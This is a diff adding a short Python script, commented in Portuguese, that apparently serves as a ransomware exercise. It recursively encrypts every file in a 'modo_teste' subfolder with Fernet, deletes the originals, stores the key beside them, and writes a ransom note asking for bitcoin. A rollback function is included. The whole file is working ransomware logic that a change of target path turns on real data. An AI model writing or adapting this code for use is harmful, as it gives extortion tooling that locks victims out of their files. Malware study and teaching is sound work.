@@ -1,0 +1,41 @@
+#antes instala o pip cryptography
+from pathlib import Path
+from cryptography.fernet import Fernet
+
+#geração de chave única para descrptografar
+def gerar_chave():
+    return Fernet.generate_key()
+
+#percorre alvos e salva a chave dentro da pasta de crypt para validar rollback
+def criptografar_pasta(caminho):
+    key = gerar_chave()
+    fernet = Fernet(key)
+    alvos = Path(caminho).rglob('*')   # arquivos de teste apenas nesta sub-pasta
+    for alvo in alvos:
+        if alvo.is_file() and not alvo.name.endswith('.enc'):
+            txt = alvo.read_bytes()
+            enc = fernet.encrypt(txt)
+            alvo.with_suffix(alvo.suffix + '.enc').write_bytes(enc)
+            alvo.unlink()
+    # salva a chave fake de demonstração (cofre externo fica como exercício extra)
+    Path(caminho, '__KEY__.bin').write_bytes(key)
+    return key
+
+#função extra de rollback/descrypt (por facilidade do exercício)
+def descriptografar_pasta(caminho, key):
+    fernet = Fernet(key)
+    alvos = Path(caminho).rglob('*.enc')
+    for alvo in alvos:
+        decr = fernet.decrypt(alvo.read_bytes())
+        alvo.with_suffix('').write_bytes(decr)
+        alvo.unlink()
+
+if __name__ == '__main__':
+    caminho_alvo = Path(__file__).parent / 'modo_teste'
+    chave = criptografar_pasta(caminho_alvo)
+    print('[+] Arquivos criptografados dentro de:', caminho_alvo)
+    with open(caminho_alvo / 'README_RESCATE.txt', 'w', encoding='utf-8') as msg:
+        msg.write('Tudo foi criptografado :D\nEnvie BTC infinito e talvez devolva.\n')
+    print('[+] Mensagem de resgate gerada')
+
+# Para desfazer tudo:descriptografar_pasta(caminho_alvo, chave)
